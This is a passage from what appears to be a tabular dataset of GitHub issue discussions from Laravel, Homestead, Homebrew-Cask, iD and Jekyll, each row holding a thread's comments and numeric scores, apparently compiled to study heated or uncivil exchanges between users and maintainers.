lack of time or passion. He protests the idea of composite keys, because some folks actually think you should always have a surrogate key.  I don't mean to pick on him, he's done fantastic work, but with all of the support this issue has gotten I think we need a well thought out reason on why Laravel will never have composite keys OR, even better,  what can be done to get this done. After assessing what needs to be done to get composite keys working I can understand why he would want to avoid it. I think it would lead to a very healthy refactoring of the relationship classes. As I've said before, If he's willing to accept a patch for this feature there are many people who want to work on this. If he's hesitant because he has specific things in mind for this feature - or lines he wouldn't want crossed, he could communicate them to us on this issue. Outside of my work in PHP, ALL ORMS I've developed or used in the real world supported composite keys (Java might've spoiled me) so I find other libraries being hesitant a little odd. As I've said before, Laravel to me completely legitimizes developing large and well architected websites in PHP. The company I work for has used it dozens of times for small to large clients. It's definitely one of my favorite frameworks - save this one thing. Laravel's tagline shouldn't be ""At least as good as the competition"".  @friend I don't think @friend would reject if you/anyone can come out with a complete Pull Request to add composite key support for Eloquent. You can't expect someone that doesn't use composite key him/herself to create such feature. I myself would never consider making that PR because I don't have all the knowledge to cover all possible use case.  I rarely use surrogate key if it's meaningless, and I use composite keys a lot in applications. I don't see a good reason to force using surrogate key. So please support composite keys in Eloquent.  May be if we collect enough ""plus one"" I will make the solution  Guys this is ridiculous, while I really enjoy working with Eloquent, the idea of adding a completely useless column just to ""make it work"" is unacceptable. This is such a no-brainer, Doctrine 2 does have native support for composite keys as well. Why not Laravel?! plus one!  I would like composite keys plus one  plus one for composite primary keys, there's no good reason to force using surrogate key, is there? In addition, the fix proposed on #5517 is ridiculously simple and works flawlessly, I don't see why you wouldn't merge it on master. A pity.  Composite keys are really useful in use cases where you have an NxN table with a High read and write throughput. I guess one could argue in that case you don't use auto_increment, you should use a hash as primary_key instead of integer and suck it up using an UNIQUE constraint, but in my point of view this ""workaround"" is not the ideal scenario for a situation like this, it just creates confusion in something that should be simple.  plus one I put here my own solution I'm using a Abstract Model which one final model has extended and in his private property of primaryKey I declared an array with the name of each field on my composite key.  This is just sad. plus one for all its worth... ",70,29,606,0,0,387,34,n,
framework/laravel/6531,0.047747629,laravel,framework,[Proposal] Allow per-project installations for Homestead 2,15054,189,92,0,3,"With the rewrite of Homestead v2, it is now considerably more difficult (if not impossible) to share development environment code on a project. One of the key benefits of Vagrant is committing the  to a repository and thereby having all developers working from the same environment. (Isn't that the whole point of Vagrant?) But with Homestead 2, all your config lives in your own personal  directory, and is non-shareable. I was never really a fan of the instructions for Homestead 1 which advocated using a single, central clone of the homestead repository. (Am I really the only one who uses separate homestead boxes per project? Do other people prefer not to segregate environments? That's like developing on our own little shared hosting boxes, allowing different project code and installation requirements to co-mingle.) But at least with the original Homestead it was possible to put the homestead files inside your project's repo (I used , since I'd customize the provision scripts.) With Homestead 2 and , the ability to customize the environment is getting better (and somewhat more reproducible), but taking a huge step backwards in shareability. While bundling homestead commands as a composer project is great, further centralizing config seems to be taking Homestead in a wrong direction...  After further thought, I've come to believe Homestead is designed around having developer-centric environments, as opposed to project-centric environments. Which seems entirely backwards to me. Sure, it works if you're developing a very basic application* and the stock Homestead install works out of the box for your project, or if you're working alone. But I've worked on very few projects that have the same server-side software requirements or are limited to a single developer. Need to add elasticsearch? Switch to MariaDB? What about build tools other than grunt or gulp? Want to use the awesome maildev during development? Homestead allows you to customize your development environment, and do so in a way that isn't affected by your host system. But it doesn't allow you to share those customizations. Which is a huge step backwards from the massive improvements (and productivity gains) Vagrant has brought to the development process. * I assume some will argue that the default Homestead box is designed to work with Forge, which is very probably true. But will Forge really never get the ability to add provision steps and add customize server environments during deployment? Maybe not, but if not, it will remain relatively niche. I love Homestead and Forge because they provide clean, solid base environments on which I can develop. But if I have to give all that up and start from scratch as soon as I need to customize my environment, that doesn't make me code very happy. I hope we can figure out a better way to manage development and deployment environments using the full power of the tools we have...  Couldn't you still use a subtree for the latest version though? The repository is still there laravel/homestead I'm sure you're not required to install the global Composer package and use the  command.  Not really. The Vagrantfile already assumes a  directory. And I can only guess it's going to go more down this path. On top of that, the subtree solution isn't a great one to begin with. It's hard to maintain as soon as you need to make changes to the Vagrantfile or homestead.rb, in which case you're basically giving up on future upstream changes. Which, from what I can tell, is one of the reasons for the changes in Homestead 2. But I just think it's limiting Laravel development more than expanding. What I'd be hoping for is more of a modular system, where concepts like  are a bit more flexible and can be loaded from a project (or also a home directory if desired). Something like the way  and other configuration systems work, maybe using Vagrantfile inheritance. It adds complexity, but there's no reason it needs to be exposed to most developers. If working out of a single shared box is fine for your needs, great. I just wish Laravel offered support for better practices from the start.  Ah you're right. I didn't even take a look in there. I agree that more flexibility for more advanced developers should be as big a priority as making it easy for newer developers to quickly get up and running. But I'm hardly one to comment on how it would be achieved as I'm not exactly a pro at Vagrant or provisioning servers. grinning  I was about to propose a way to fix this in your  file you could have a  (name negotiable) array that has file paths to the root of a laravel install and it can read the a  for the site specific stuff like provision scripts and database names and site public directory and local url just an idea I will be ready to submit a pull request later about this  Agreed, I prefer to have separate boxes per project and am currently rolling my own solution as well.  Homestead 2 indeed makes this more difficult.  I want my project to configure the box.  @friend That would be an improvement over the status quo, but not really go far enough to be too useful. How many settings can you really put into ? I mean, all of them benefit from being project-specific, but are less important settings that be maintained by all developers across a project (though I advocate they absolutely still be shared settings). At a minimum,  and  also need to be able to be project-specific, but this would be much cleaner if these two extra script files [had been implemented as part of Homestead.yamlHomestead.rbVagrantfile~/.homestead/Homestead.yamlhomestead upHomestead.yamlafter.shaliases` if they exist. That would be much closer to a more flexible system that could still work the way it currently does if users want that (though personally I'm not a fan of recommending developers use a shared host model at all).  @friend @friend most people using homestead don't need all of the customisability of vagrant, they just go  and everything works for them I think homestead is targeted to people who may be a bit scared of the command line and prefer to work with things that they can see if you want to run a application per vm then I think you should be using just normal vagrant this is where is was trying to go with my changes now to configure homestead you will just edit the  in the project directory and not have to find it in a hidden folder or run a console command and I was going to add a way for homestead to add that project file path by its self  maybe with  and then it will add the current working directory to the  array and look for a  in that directory for the settings used by that project  maybe even if homestead included the laravel installer so that running  it could install a new version of laravel and then add it to homestead automatically  Using words like ""most"" is ill-advised, as you have no way of knowing that. However, my main issue isn't that these changes to Homestead occurred at all, it's that they occurred in a way to make it unusable for those who do need more flexibility. Your proposed changes will help, but don't offer enough flexibility. Purestead does, but is a complete fork and therefore I'm not sure the benefit. I'll probably get around to extending Homestead using proper Vagrant inheritance...  @friend, I totally agree with you. The way homestead is going on is making it more difficult to share customized projects with a team. Will be much better if it follow the vagrant approach or as you say adds more flexibility of configurations per project.  Definitely agree with this. I've got many clients and many different projects; the beauty of Vagrant is being able to share those development configurations with the team, and to limit the impact of one environment on another. With Homestead 2 those key benefits no longer exist -/ Purestead looks like it might be a better option for now. First I've seen of that; will be trying it out.  plus one Homestead seems to drift away from the core Vagrant principal of discreet project server environments, for reasons I'm yet to understand.  plus one Agree with this. It's a nice idea, but it would be great to have the option to use Homestead as a standalone vagrant project as well.  I agree with this as well. It would be great to have a .homestead.yml file per project. It could work like Vagrant does.  would create a homestead.yml in your project root folder (similar to  ) instead of using a global file. For now, I am using only the homestead box directly with vagrant.  Project specific Homestead environments are absolutely critical for our workflow. We will quite simply not be able to utilise Homestead as it stands at present.  So question  if you want homestead to work like vagrant why don't you just use vagrant?  The last commit on  was today so it is being worked on and it uses the same Box that Homestead does so it is the exact same software stack  i think, the discussion ""if you want homestead to work like vagrant, than use vagrant"" leads to nowhere. An example? Laravel (git)ignores the vendor dir per default but the default vm for laravel gives us no direct automatism to install the vendor dir?! Every team - my team, team of @friend, etc. - needs to implement provisioning additionally for getting even the minimum of loading the vendor dir.  @friend I find your ""I work this way, and so should you, or go elsewhere"" attitude to this issue unconstructive and opinionated. ""Use another product"" is not an appropriate response to this issue.  Because the product fits your needs does not make it appropriate for everyone, especially when the issue is with functionality which has been removed.  I've experimented lot's of frameworks since ruby on rails first came out, maybe 10 years ago from today, and what I like and amazed about laravel is there's a decent answer to virtually any common problem (which is the definition of a framework), without sacrificing flexibility and with great documentation. Homestead is a good utility for building up the dev. environment but it sacrifices some flexibility this time and I believe this is a very common case. Yes you can always set your own vagrant box or use an alternative but that's what we do with zend framework or symfony or any other popular framework, isn't it?  I agree it's a missing feature. Vagrant supports multiple VMs per environment. Maybe this can somehow be used to allow for per-project VMs?  I'm not saying you cant use homestead I'm working in a group of 3, so homestead wouldn't work for us because if one person makes a change  like installs Mongo how do you handle that?? homestead as it is, does not handle stuff like this, so I made some changes to homestead and just copy them into the root of my project you can see my changes at  is more customisable and all configuration is now in the repo if you want mongodb on your vm just write a create-mongo.sh in the scripts and change homestead.rb to run it I have no idea who you would get homestead to do this  @friend You got the provisioning script in your project, which everyone uses? I don't understand, how you point invalidates provisioning per project for homestead?  I think the best you could get homestead to do is copy the files into you project for you and maybe be a wrapper around vagrant to tell you when you may need to provision again I would not be opposed to homestead being able to do that but it should be to do this as well as have it's original functionality ‚ô†homestead init --localHomestead.yamlVagrantfilelocal mode` where is just runs vagrant in the current directory but if it doesn't find one of those files it runs it in the global version that would be cool but now this is just how vagrant works but with some sugar  ""just how vagrant works but with some sugar"" sounds perfectly fine to me. Homestead was (prior to version 2) essentially a Laravel-ready Vagrant configuration with some helpful wrappers around configuration and cli commands. There's nothing wrong with that; it was very useful. I've been happily using Purestead on recent projects anyway, so this isn't a massive issue for me (i.e. alternatives are available). I'm just not aware of a good argument for this change to a ""global Homestead"" in version 2. It's a lot of extra steps now to get my team on the same environment, and I don't see what's been gained.  You can also still use Homestead 1.  @friend I will have to find a source for this but the goal with Homestead was to have a way to quickly set up a new laravel site in vagrant and making a new box in vagrant is slow so put them all in the same box I think homestead is good for personal projects and tests eg trying out a new package or trying out a new concept I think @friend mentioned this in the lavavel podcast ep 19 but I could be wrong I will listen to it again and find out after work  If you want to have a look at how i think local installs of homestead could work have a look at laravel/homestead#173 just an idea discuss  I have been using a customized version of homestead after version 2 because of this issue, today this issue came to my attemption and made me figure other people shares this same opinion, so i open sourced my customized version  is basically homestead, no customizations at all, only simplified and per project based.  I think this global homestead is a step backwards, it makes it really hard to commit the dev environment to source control and for other devs to simply vagrant up and get cracking. Plus the provisioning script is running for every homestead up? Each project has it's own provisioning requirements....  Have to agree here, it seems a bit backwards. If we could add something similar to what @friend said above (check project folder first, then user folder) then that would be awesome.  I tried to talk to Taylor about it and he said that he though Homestead was ok as it is so if we want a feature like this we will have to fork  but there is already projects around that do this eg purestead and firestead I also don't think another homestead fork is a good idea   Sucks to hear that disappointed  so, no original homestead in bigger teams with multiple homestead projects for me ... -1  I feel bad about this too, but there is no way to please everyone... I don't know if the majority liked this new way, but seems to, as it's simpler... That's why forks exists, someone doesn't like the direction of the main project and fork and customize. We have two good alternatives, as @friend pointed, purestead and firestead, i haven't tested purestead but seems pretty good to me.  plus one I agree with many of the opinions stated in this thread. I love Homestead. I think it has been a great project but with Homestead 2, the added  directory has caused more problems than solutions for me. I don't really like having Homestead in 2 different directories either. I have started opting for other solutions but would prefer to stick with Homestead if possible.  ping @friend this is already achieved so probably you can close this.  Thanks @friend. ",57,0,383,0,0,223,21,y,
framework/laravel/8392,0.051449085,laravel,framework,Translate queued mails (localization),3841,49,26,0,1,"I am looking for a working solution, to translate queued emails. Unfortunately, all emails use the default locale (defined under ). Let's assume, we have two emails in the pipeline, one for an English  user and another for an Japanese  user. What data should I pass to the  facade to translate (localize) the queued emails?   // User model   $user = Userfind(1)-&gt;first();    Mailerqueue($email, 'Party at Batman\'s cave (Batcave)', 'emails.party-invitation', [      ...      'locale' =&gt; $user-&gt;getLocale(), // value ""jp"", but does not work     'lang' =&gt; $user-&gt;getLocale(), // value ""jp"", but does not work     'language' =&gt; $user-&gt;getLocale(), // value ""jp"", but does not work   ]);   A different template for each locale is not a solution... (imagine an application with 10 languages...) There is no way to achieve this?  Why is this issue closed? Is it solved? Is there a way to utilize the locale in queued mails? I think it's really annoying that @friend is closing issues without a proper solution/fix. Imho that doesn't help at all. Keeping this thread open shows that this is still not addressed and needs some solution sooner or later. I would appreciate a solution where it's possible to pass a locale to the queue method. I've also seen suggestions to set the locale via  within the queue callback. But unfortunately that doesn't help either.  plus one this needs to be reopened.  It's insanely bad that I can't handle this at all... The only solution I've found is passing the locale to the mail, and then passing it onto the trans() method.. Horribly time consuming and ugly when having +50 templates, and an text only version too. I have to at least do manual labor on plus one00 blade files.. How can it be that even changing language before queue, and inside the closure - does not work..?  I just came across the very same problem. Has this been solved? This is a very essential feature that is overlooked! Anything that is thrown into a queue should pass the original locale own to the job! There is no reason not to.  @friend, I really appreciate your tremendous contribution for the community. But your attitude is quite annoying. You act like the guard dog of issues without even allowing a discussion on valid issues (you will probably close this issue now and limit discussion to contributors because I wrote this ;-)). While the Laravel ecosystem is promoting a friendly ""netiquette"" all I see is issues being instantly closed for no good reason. Obviously people are having trouble with this issue 13830 So it doesn't help to tuck it away by closing it. As far as I can see it is not solved and it is a problem for millions of non-English speaking developers. What is the best way to address this issue without the issue being instantly closed? I'd be glad to give it a shot!  I second that @friend It is quite (very!) annoying that these issues are closed before a sensible discussion on the issue is allowed. @friend what are your thoughts on this? I would suggest developing it along the lines of what was discussed in #13830 and submit a pull request. Hopefully, it will be seen as a welcome ""feature"" and accepted.  This feature request is being discussed on laravel/internals#394 that's the reason that this issue is closed... We use that repo for feature requests, you guys could share your ideas there... üòÑ  Perfect! Thanks @friend  Thanks @friend. That's the kind of answer I was hoping for )  I see discussion is still in progress in related internal issue. Came here with assumption that Carbonnow()-&gt;formatLocalized('%B %Y') is also affected with this issue.  I had the similar problem. Check my StackOverflow answer. The idea is to inherit  class and replace  method, then your Mailables will take care of current locale automatically!  I believe this was solved in Laravel 5.6? ",12,0,217,0,0,78,16,y,
homebrew-cask/Homebrew/27364,0.086658765,Homebrew,homebrew-cask,`search` gives bad results when there are multiple casks with the same tokens across repos,12227,158,75,0,4,"@friend Started working on this in  but it was never finished. Reported issues where we can see the problem   Is anyone assigned to this? Or does this mean it is open to development by anyone who wants to submit a PR to close it?  Anyone can submit a PR for this.  In terms of hours of work invested vs. work pending, I feel the unfinished PR is pretty close to completion. By the time of my last commit (8 Dec 2014), the PR seemed feature complete but lacked a few tests. Now with two years having passed, it‚Äôs going to need a very thorough rebase on top of that. I‚Äôd definitely love to finish it myself but right now I can‚Äôt. I have published all my work in progress to the branch  in my fork. As @friend said, anyone is free to work on it. Whoever wants to contribute should feel free to start from scratch ‚Äì there are definitely quicker and simpler solutions than my large refactoring ‚Äì or pick up my  branch if deemed helpful, and finish it, or gut it to their heart‚Äôs content. Either way, I‚Äôm excited and looking forward to having a  command that works like it should! üòä  Just tried to rebase, ended up realizing there is no core anymore. I had completely forgotten üò≥ Given the work already done was rather invasive, I can‚Äôt risk missing any relevant changes to the core while rebasing. So I really want a coherent Git history along the way. To achieve this, I‚Äôm thinking of multiple steps  Rebase my work against the old  history, stopping at the last commit before the folder was finally deleted;  then, fork the Homebrew repo, branch off the initial commit from August;  commit the result of step # 1 onto that branch, and  continue rebasing normally against brew/master.   @friend/maintainers Any advice on a simpler solution? How did you go about similar problems in the past?  Not really. Before moving the core we tried to merge as many core-related PRs as possible. The remaining ones were either closed due to lack of interest or merged relatively quickly afterwards.  @friend Alright. I wonder though what would be the proper way to run any cask command from my dev working copy? Before the transition, we used to have  and  to switch modes. These used to be a piece of cake and was well documented. I wonder where the equivalent thing in Homebrew is? I searched all the folders I deemed somewhat relevant, especially , , , , and of course, the  subtree, but nothing helpful has turned up there. The consequence is that right now, I‚Äôm unable to run literally any command from my dev working copy of Homebrew. I have read all the docs ‚Äì especially the three documents for maintainers ‚Äì however, I have yet to find anything even remotely related to my issue, or even some kind of documentation on how to properly set up the Homebrew repo for development. Nothing has worked so far. My simplest test case is I look at the commit hash that  gives me. So far, it has never been the one that corresponds to the HEAD of my repo. Speaking of test cases not only are the  scripts gone; someone also seems to have removed almost all of the test tasks from our , which is in the new  directory; this of course broke both  and . This apparantly happened some time after the transition. I wonder how you manage to run any core test cases now? (The documentation to Homebrew does mention ‚Äútest bots‚Äù ‚Äì however, these are probably not suitable for quickly testing along as I do changes to the core. Also, I can‚Äôt access those anyway.) I understand that I‚Äôm obviously missing something ‚Äì but what is it? After one day of achieving literally nothing, I‚Äôm running out of ideas and feel really confused and frustrated. Would you mind please giving me a nudge in the right direction?  As far as I can remember the scripts were linking the development tap to , so these were removed because they wouldn't have worked anymore, as the  command is now integrated into Homebrew. Now you will either have to checkout to a different branch in the  while developing, or set up a separate Homebrew installation. Tests are now run with , which you can find in . However, I am currently in the process of merging these with .  @friend Thanks for the pointers! I don‚Äôt see how these two things are related. If we‚Äôre able to move a thing from A to B, how are we not able to modify those scripts to have them point to B instead of A, rather than throwing them away? That, admittedly, is a little beyond me. To explain the itch behind my question, I‚Äôm going to let you guys in on the fact that I find myself having a embarrassingly hard time getting my dev environment up and running, especially when compared to the old HBC repo. This factoid is seemingly unrelated to the discussion at hand, and it might not have anything to do with Homebrew, and might very well have everything to do with my personal attitude, learning curve, or patience. Except when it doesn‚Äôt. The thing is, I was bitten once and became shy twice. I do love Homebrew, you know. It‚Äôs a pleasure to use, and certainly an insanely convenient thing to have. I do also love . But boy, have I learned to steer clear of ever standing in its merry way. To back up my claim, I just need to look at my local working copy of HBC. Not a long time ago, I used to know exactly how, and when, to , mainly thanks to . Never did I break, let alone lose, any of my work on a Cask or the HBC code. Now compare to all this my stash of custom Homebrew formulae. I‚Äôve written only a handful of those throughout the years. Nothing spectacular, and all of them for my own use. Sometimes my formul√¶ even have credentials in it because who cares. I used to tuck away all those formulae of mine in private branches but guess what? One day in 2015, my formulae started to disappear. My uncommitted changes? Vanish into thin air. My branches? Poof. At first, I would not notice ‚Äì because whatever it is that keeps snatching my formulae, the thing loves to strike silently, probably out of spite, or maybe because it secretly longs to be a ninja. By all means, it chooses not to blow up in my face like Git does whenever it finds a hairline crack in a whitespace (but wait ‚Ä¶ didn‚Äôt Homebrew use exactly Git behind the scenes? ‚Ä¶ Oh right, they use  now. My bad). So, weeks pass, or even months, without me noticing my formul√Ü are gone, until the day there is some upstream release, and off I go and update formula XY, or so I think! Actually, I can‚Äôt update formula XY because formula XY is gone. Gone because someone decided to change the color of the magic smoke inside  once again and the old smoke took with it all the feature branches, or stashes, with my custom formul√¶ in them. Do I bother? Keg no. I usually just shrug and move on with my life because I‚Äôm a big girl and I can cope with worse things than the fact that formula fidgeting and  magic are just not my thing. But now that HBC is with Homebrew, all of that has changed, I guess? No more weaseling out of staying on top of how  works internally this season! Gonna have to bite the bullet and learn how to , and how not to have my stuff ninja clobbered, right? Because ‚Äì albeit admittedly on-and-off ‚Äì I am a Homebrew-Cask core maintainer and I plan to remain one for years to come. Yes, I‚Äôm going to bite the bullet and work on the HBC core in a private branch, below , and stop complaining, and become a socially likeable person again. But before I do that, may I ask the simple question Why exactly is it that we cannot keep  and  around? Pinging @friend/maintainers for advice, consolation, or both.  To be honest, I hadn't used these scripts before the merger, so there wasn't any incentive for me to make them work with the new setup, and nobody complained when they were gone. Also, keeping them in  doesn't really make sense anymore since this is now just a Tap. I can't say anything about this since I never had any trouble with , but I understand your frustration and therefore need to have a decoupled development copy. Much of Homebrew-Cask is now intertwined with the Homebrew core, and will only get more integrated over time, so you will probably end up editing the Homebrew core anyway ‚Äì ~~~~, basically. Of course you could argue that the scripts can be adapted to edit the Homebrew core instead, but I think it's really a matter of personal preference if you want to work directly inside the production  or  a second development copy.  It‚Äôs not that I‚Äôm trying to bring back this feature purely for my own convenience. Let‚Äôs put ourselves ‚Äì for a moment ‚Äì in the shoes of a first-time code contributor who has just cloned the repo to, say, , has written some code, and is now just about to test their first PR. Is it then not poor UX&lt;sup&gt;[1](#footnote-1)&lt;/sup&gt; to have them learn to their surprise that there‚Äôs no way to run the code they just built? For the record, I‚Äôm positive that whoever removed the scripts did it with the best of intentions in mind. This doesn‚Äôt change how unhappy I am with the status quo though. &lt;p id=""footnote-1""&gt;&lt;sub&gt;&lt;strong&gt;[1]&lt;/strong&gt; or dev‚Äôs experience, in that instance&lt;/sub&gt;&lt;/p&gt; Lucky you. üçÄ  But even in a bug-free universe, where  plays with kittens, I believe the UX aspect (see above) is still crucial in the long run. Contributing code needs to be accessible for anyone with a GitHub account. You‚Äôre correct; it‚Äôs not what I had in mind either. Basically, what I want to achieve here is a workflow roughly similar to what we had before the transition. To get more precise, what I‚Äôm trying to do is this   Step Status Description     Step¬†1 Normal I choose a location in the filesystem, e.¬†g. .   Step¬†2 Normal I  the complete Homebrew repo to , either from the official repo or from my own fork.   Step¬†3 Normal ‚Üí Linked I‚Äôve just written some code, now I need to test it. Thus, I run .   Step¬†4 Linked From now on, whenever I say &lt;sup&gt;[2](#footnote-2)&lt;/sup&gt;, it‚Äôs going to do the exact thing that  says instead of what  says &lt;sup&gt;[3](#footnote-3)&lt;/sup&gt;.   Step¬†5 Linked ‚Üí Normal I have finished my work. Now I‚Äôm ready to go back to production mode; thus, I run .   Step¬†6 Normal All is back to normal. I can run . In particular, my work in  is completely safe from the grasp of .    &lt;p id=""footnote-2""&gt;&lt;sub&gt;&lt;strong&gt;[2]&lt;/strong&gt; Let‚Äôs ignore the non-cask  commands for now. I‚Äôd be indifferent as to where those would point.&lt;/sub&gt;&lt;/p&gt;&lt;p id=""footnote-3""&gt;&lt;sub&gt;&lt;strong&gt;[3]&lt;/strong&gt; or whatever  happens to be at that moment&lt;/sub&gt;&lt;/p&gt;What I‚Äôd love to do is write a script that simply does what the table says. At the moment, I have no idea how to go about that, or where to start looking for a solution. If I knew more about Homebrew, or if someone kindly helped me fill in the blanks, I would gladly implement the script myself, and then send a PR on its way. Another strategy might be to do simple symlink trickery, like the old scripts did. (If I only had an idea what precisely needs to be linked, and to which target?) If I knew, I could restore  and just change it there. @friend/maintainers Any pointers?  You know what? You could probably just simply call  aliased as  or the like. This way  is safe, even if you forget to run .  Thanks @friend, will try this right away!  @friend The solution you suggested has worked great so far! Exactly what I needed to get going. üëç  Cloning into 'brew'... [‚Ä¶] $ cd brew Homebrew-Cask 1.1.5-66-g4ca2eaf caskroom/homebrew-cask (git revision de574; last commit 2016-12-29) $ bin/brew cask --version ==&gt; I‚Äôm in the dev repo ‚ô†  Great to hear! üëç  Can also attest to that. Used it for  This issue has been automatically marked as stale because it has not had recent activity. It will be closed if no further activity occurs.  @friend I seem to recall some discussion not too long ago (was already 2019?) in either the Homebrew/brew or Homebrew/homebrew-core repo about this very subject, and the conclusion being that it‚Äôs best to avoid having formulae in third-party taps whose tokens conflict with the official taps. Is this issue still worth pursuing?  This issue has been automatically marked as stale because it has not had recent activity. It will be closed if no further activity occurs. ",30,13,487,0,0,300,31,n,
iD/openstreetmap/4880,0.194304978,openstreetmap,iD,Allow user to zoom track text,870,8,3,0.625,2,"On  that number, 7438-35? Well there is no way for the user to make it temporarily bigger to be sure he read it correctly, Zooming only helps for a second. OK he can do CTRL++++ . OK I suppose that will have to do.  If he does CTRL++++ he will have to remember to do exactly CTRL+---, otherwise he will have messed up his original situation.  Wait, CTRL++++ only helps for one second...  Changing the size of this text is something you can do with Stylish see   think it would be fantastic if somebody made a Stylish theme for iD, specifically for mappers with poor vision - maybe to adjust the size of text and contrast of the rendered elements.  Yes but that is a hack.  Please add a slider. If users were so smart that they could use external solutions, they probably wouldn't be using a web based editor in the first place.  @friend It's not ok to insult the users. ",8,0,40,0.125,0.125,34,1,y,
iD/openstreetmap/5296,0.596917555,openstreetmap,iD,gpx tracks in 2.11.1,1063,14,6,0.666666667,0,"In my opinion one of the worst updates iD got so far. I can sill include a gpx track, but to get there I have to take another step. Dowloading something from the web is nice, but I will never use that. Where is the problem to put them below each other and not have them inside a sub menu. The worst thing is that the gpx track is clickable. Since my GPS device is pretty accurate it's almost always on the way and selecting the way and not the gpx file is sometimes impossible. Grabbing a single node to move it? You can forget that one good Sir! Trump says ""GPX file first!"". If there is a need to show the track stats (three of them so far and I couldn't care less about any of them) it can be moved over to the side menu where you select it from your HDD. If you make such changes, please give me at least an option to switch back. The new version is nothing but garbage for me. It is so bad, it gives me cancer. BTW I'm pretty pissed if it wasn't clear until this point.  Wow, not nice @friend.  We've already got #5257 for this, you don't need to be a jerk. ",5,0,35,0.333333333,0,33,3,y,
jekyll/jekyll/6844,0.060050106,jekyll,jekyll,Twig syntax highlighting broken,5081,55,47,0.5625,6,"Hi, Jekyll syntax highlighting is broken with Twig. Consider the following code block containing a perfectly valid Twig syntax It outputs the following HTML Notice the err class attributed to the equal sign. Steps to reproduce  Follow the official quick-start guide  the content of the post created by the installation with this   How is the resulting output if you were to use triple-backticks instead?  So you see the issue is not with Jekyll but rather with Rouge that  and the triple-backticks block uses to highlight code.  No, the problem also happens with the  syntax.  Yes, that's because the  tag uses  for syntax-highlighting by default  you want to use  instead of  as your site's highlighter, add the following to your   This sounds like an issue with  rather than Jekyll. Jekyll has no knowledge of syntax of any language.  @friend, why did you close this? It's not fixed and I'm not the one explicitely using Rouge. The maintainers of the project are using a dependency that is buggy, they should take care of this.  I‚Äôve provided a link to the repository so that you can open an issue there and explain the problem you are having. I do not know what ‚ÄúTwig‚Äù is, so it would not make sense for me to be the one to explain what needs changing in Rogue. There is nothing in Jekyll‚Äôs code that can be changed to fix this issue; the fix will have to come from Rogue. Here is a link to Rogue‚Äôs Twig lexar  That's not my point. You are the one using Rouge to implement a feature that you advertise explitely on your docs! That's your responsibility to take care of things that don't work as expected in the dependencies of your project. As a consumer of your product, I expect it to work as advertised  are advertising syntax highlighting, you are supposed to deliver! And if you don't, you are supposed to take care of whatever is needed to have your product work as expected. And don't start me with open-source and this-product-is-free. If you embrace open-source concepts, you also embrace the responsibility that comes with it.  @friend We're sorry that you're facing issues while using Jekyll. I agree that you as an end-user shouldn't concern yourself about bugs in dependencies. One of the maintainers will get in touch with the developers at Rouge and sort things out for you.  @friend, thanks a lot. I already created an issue, maybe a maintainer could comment on it if it's not clear enough  @friend Please take a step back and consider that this is an entirely volunteer-run project. We're not contractually obligated to work on every bug and answer every question, seeing as we simply don't have enough resources. So our apologies if some things take too long, or don't end up happening, but it's wrong to blame the maintainers for this.  @friend, I totally understand that and i can relate maintaining open source projects is very time-consuming. But I'm not having that discussion because I want to see that bug fixed immediately, to be honest this is a low priority bug even by my own standards. My point is that if, when a bug happens, maintainers blame a dependency, close the issue and ask for the reporter to open an issue elsewhere, that could go that way Jekyll Oh, sorry this is a bug with Rouge, go open an issue there. -&gt; Rouge Oh, sorry this is a bug with Ruby, go open an issue there. -&gt; Ruby Oh, sorry this is a bug with GCC, go open an issue there. ...and so on. At one point, my issue will be invalid because I won't even know what and how to report the bug. Already, Rouge maintainers could totally close my issue as invalid because I'm giving a way to reproduce that imply Jekyll - it would be legitimate for them to say that it's a Jekyll bug or that they want a reproducible example using only Rouge.  @friend The way I see it, this issue could pop up in any software that uses Rouge, and is therefore not specific to Jekyll. I agree however that it could have been better communicated before it was closed, sorry about that.  @friend I re-opened the issue to convey that we have not abandoned this report straight away.. Do know that I've kept a tab on the issue-ticket at Rouge and will follow its proceedings as time permits..  This issue has been automatically marked as stale because it has not been commented on for at least two months. The resources of the Jekyll team are limited, and so we are asking for your help. If this is a bug and you can still reproduce this error on the &lt;code&gt;3.3-stable&lt;/code&gt; or &lt;code&gt;master&lt;/code&gt; branch, please reply with all of the information you have about it in order to keep the issue open. If this is a feature request, please consider building it first as a plugin. Jekyll 3 introduced hooks which provide convenient access points throughout the Jekyll build pipeline whereby most needs can be fulfilled. If this is something that cannot be built as a plugin, then please provide more information about why in order to keep this issue open. This issue will automatically be closed in two months if no further activity occurs. Thank you for all your contributions. ",21,2,160,0.3125,0.125,97,4,y,
jekyll/jekyll/7432,0.045791791,jekyll,jekyll,docs: Add a theme step to Step by Step Tutorial,2889,32,15,0.545454545,3,"Plase, add a step on the Step by Step Tutorial to demonstrate how to theme the just finished demo app. Motivation  Theming is not an obvious task for a newbie like me. Also, doc speaks about gem based and 'regular' file themes. It's confusin  a bit. At the end of demo app it's more beautiful to leave in the han of the user a well looking demo  Idea Please include istructions on  how to enable default gem base theme how to customized if possible a gem theme how to switch to a regular file based theme idem, how to customize it  ... or ... Create a guide on how to start theming AND then include previous steps into the new tutorial. Thanks for this excellent piece of software !!!!  On how to start theming for Jekyll, I'd recommend @friend articles   Thanks, but it's better have an official doc, and not links to external resources. IMHO  If it's validation you're looking for then I can 100% endorse these tutorials ‚ú®. However if you want this set in stone then maybe we could link to these tutorials in the official docs? Maybe in  or  What do you day @friend?  What about allowing Jekyll sponsors to post tutorials directly on the site. Each post has a  content sponsored by CTA use rel=‚Äùcanonical‚Äù tag to sponsors blog. Author of the article gets paid by the sponsor. Jekyll gets better docs.   IMHO, Documentation is one thing and a (sponsored) community blog is an entirely different league altogether. They should not be intermingled. Documentation is translating ""the code base"" into layman lingo. (Point-of-View Maintainers -&gt; Users) Community blog is about sharing experience with the code base. (Point-of-View One User -&gt; Other Users) Bringing the sponsors into the mix, is just complicating things, unnecessarily.........  Hi @friend I agree with you here. I'm thinking the Tutorials section could highlight the community in this way.  Sorry but ... To rest in topic... A simple step added to main step by step intro is so wrong?  I don‚Äôt see what is wrong with referring to a tutorial on another site? Yes the tutorial was paid for, but tutorials of that size take time to create. Maybe we could add some more detail on the points people are getting stuck on in the docs?  If I see a tutorial on an external website it soon or later will become obsolete. If I see a tutorial on main site I think that must be ok, tested, and updated. Simply. Close this issue A company that does not understand the need of a full doc do not will offer a serious support in the long time Bye bye.  Jekyll is an open-source project freely maintained by volunteers, it has been around for 10 years now and powers hundred of thousands of websites around the world. Jekyll has a great community and docs are continuously improved with the help of the contributors. Jekyll themes are documented. I'll see if I can add some links to point to theming at the end of the step-by-step guide. ",11,4,105,0.181818182,0.272727273,80,9,y,
